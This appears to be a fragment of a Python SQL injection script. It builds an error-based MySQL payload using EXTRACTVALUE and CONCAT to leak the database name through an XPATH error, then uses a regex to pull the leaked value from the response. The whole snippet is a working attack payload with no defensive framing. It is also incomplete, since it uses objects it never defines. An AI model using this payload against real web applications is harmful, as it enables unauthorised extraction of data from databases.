import re

payload = "1 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database())))"
error_pattern = re.compile(r"XPATH syntax error.*?'~([^'<]{1,200})'", re.I | re.S)
query = session.build(payload)
match = error_pattern.search(response.text)
